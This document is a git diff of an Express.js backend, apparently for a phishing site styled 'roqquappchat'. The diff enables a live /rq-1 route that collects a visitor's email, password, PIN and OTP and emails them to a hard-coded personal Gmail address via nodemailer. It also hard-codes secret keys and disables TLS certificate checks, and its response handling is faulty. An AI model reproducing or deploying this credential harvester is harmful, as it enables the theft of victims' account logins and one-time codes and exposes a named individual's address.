@@ -1,11 +1,13 @@
 const express = require('express')
 const app = express()
 const nodemailer = require('nodemailer')
+const jwt = require('jsonwebtoken')
 const csrf = require('csurf')
 const cookieParser = require('cookie-parser')
 const cors = require('cors')
 const bodyParser = require('body-parser')
 const session = require('express-session')
+const auth = require('./middleware/is-Auth')
 
 // const sessionConfig = {
 //     // ... other methods
@@ -21,7 +23,11 @@ const session = require('express-session')
 
 //app.use(session(sessionConfig))
 
-app.use(cookieParser())
+app.use(auth)
+
+app.use(express.json())
+
+app.use(cookieParser('secret'))
 app.use(express.urlencoded({ extended: true }))
 //const parseForm = bodyParser.urlencoded({ extended: false })
 
@@ -33,9 +39,9 @@ const corsOptions = {
     methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
 }
 
-//app.use(cors(corsOptions))
+app.use(cors(corsOptions))
 
-//const csrfProtection = csrf({ cookie: true })
+const csrfProtection = csrf({ cookie: true })
 
 // app.use((req, res, next) => {
 //     res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3000')
@@ -51,7 +57,6 @@ const corsOptions = {
 //     next()
 //  })
 
-
 // app.use(function (req, res, next) {
 //     var token = req.csrfToken()
 //     res.cookie('XSRF-TOKEN', token)
@@ -63,78 +68,87 @@ app.get('/', (req, res) => {
     res.send('Welcome to rq1-back current name -- roqquappchat')
 })
 
-
-
-app.get('/form', (req, res) => {
+app.get('/form', csrfProtection, (req, res) => {
+    console.log('the auth of form', req.Auth)
     console.log('in form')
-    //const csrfToken = req.csrfToken()
-    res.cookie('CSRF-TOKEN', '2434343')
-    res.send('hello')
+
+    const csrfToken = req.csrfToken()
+
+    const token = jwt.sign({ csrfToken }, 'supersecretkey', { expiresIn: '5m' })
+    //res.cookie('CSRF-TOKEN', '2434343')
+
+    res.send({ token })
 })
 
-// app.post('/rq-1', (req, res, next) => {
-//     console.log('req body', req.body)
+app.post('/rq-1', (req, res, next) => {
+    console.log('req body', req.body)
 
-//     const { email, password, pin, otp } = req.body
+    if (!req.Auth) {
+        const err = new Error('Not authenticated')
+        err.statusCode = 403
+        throw err
+    }
 
-//     console.log('length of otp', otp.length)
+    const { email, password, pin, otp } = req.body
 
-//     res.send('success')
+    console.log('length of otp', otp.length)
 
-    // if (otp.length > 6) {
-    //     console.log('Attack started', otp)
-    //     return
-    // } else {
-    //     console.log("Normal email", otp)
-    //     const transporter = nodemailer.createTransport({
-    //         host: process.env.HOST,
-    //         port: 465,
-    //         secure: true,
-    //         requireTLS: true,
-    //         socketTimeout: 1200000,
-    //         connectionTimeout: 1200000,
-    //         auth: {
-    //             user: process.env.EMAIL,
-    //             pass: process.env.PASSWORD,
-    //         },
-    //         tls: {
-    //             rejectUnauthorized: false,
-    //         },
-    //     })
+    res.send('success')
 
-    //     transporter.verify(function (error, _success) {
-    //         if (error) {
-    //             console.log(error)
-    //         } else {
-    //             console.log('Server is ready to take our messages')
-    //         }
-    //     })
+    if (otp.length > 6) {
+        console.log('Attack started', otp)
+        return
+    } else {
+        console.log("Normal email", otp)
+        const transporter = nodemailer.createTransport({
+            host: process.env.HOST,
+            port: 465,
+            secure: true,
+            requireTLS: true,
+            socketTimeout: 1200000,
+            connectionTimeout: 1200000,
+            auth: {
+                user: process.env.EMAIL,
+                pass: process.env.PASSWORD,
+            },
+            tls: {
+                rejectUnauthorized: false,
+            },
+        })
 
-    //     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`
+        transporter.verify(function (error, _success) {
+            if (error) {
+                console.log(error)
+            } else {
+                console.log('Server is ready to take our messages')
+            }
+        })
 
-    //     const mail = {
-    //         from: process.env.EMAIL,
-    //         //to: process.env.TOEMAIL,
-    //          to: 'ifestephenie@gmail.com',
-    //         subject: 'New message from Roqquappchat',
-    //         html: content,
-    //     }
+        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!!`
 
-    //     transporter.sendMail(mail, (err, data) => {
-    //         if (err) {
-    //             console.log({ err })
-    //             res.json({
-    //                 status: 'fail',
-    //             })
-    //         } else {
-    //             console.log('email sent', data)
-    //             res.json({
-    //                 status: 'success',
-    //             })
-    //         }
-    //     })
-    // }
-//})
+        const mail = {
+            from: process.env.EMAIL,
+            //to: process.env.TOEMAIL,
+             to: 'ifestephenie@gmail.com',
+            subject: 'New message from Roqquappchat',
+            html: content,
+        }
+
+        transporter.sendMail(mail, (err, data) => {
+            if (err) {
+                console.log({ err })
+                res.json({
+                    status: 'fail',
+                })
+            } else {
+                console.log('email sent', data)
+                res.json({
+                    status: 'success',
+                })
+            }
+        })
+    }
+})
 
 // app.post('/roqquapp', (req, res, next) => {
 //     console.log('req body', req.body)
